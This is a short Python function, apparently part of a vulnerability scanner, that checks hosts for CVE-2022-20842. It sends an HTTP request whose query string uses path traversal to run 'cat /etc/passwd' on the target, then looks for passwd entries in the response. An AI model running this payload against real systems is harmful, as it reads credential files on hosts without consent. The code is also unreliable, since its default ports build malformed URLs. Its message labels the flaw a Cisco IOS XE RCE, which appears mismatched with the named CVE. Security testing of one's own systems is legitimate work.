import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_colour

def check_CVE_2022_20842(ip, ports=None, timeout=5):
    headers = {"User-Agent": user_agents()}
    path = "/cgi-bin/cgiHandler.cgi"
    test_payload = "?action=../../../../../../../../bin/cat%20/etc/passwd"
    protocols = ["http", "https"]
    if ports is None:
        ports = [80, 443]
    else:
        ports = [f":{port}" for port in ports]
        
    for protocol in protocols:
        for port in ports:
            url = f"{protocol}://{ip}{port}{path}{test_payload}"
            try:
                response = requests.get(url, verify=False, timeout=timeout, headers=headers)
                if response.status_code == 200 and ("root:" in response.text or "admin:" in response.text):
                    print_colour(f"[+] Target is vulnerable to CVE-2022-20842 (Cisco IOS XE RCE): {url}")
                    return True
            except requests.RequestException:
                continue
    return False 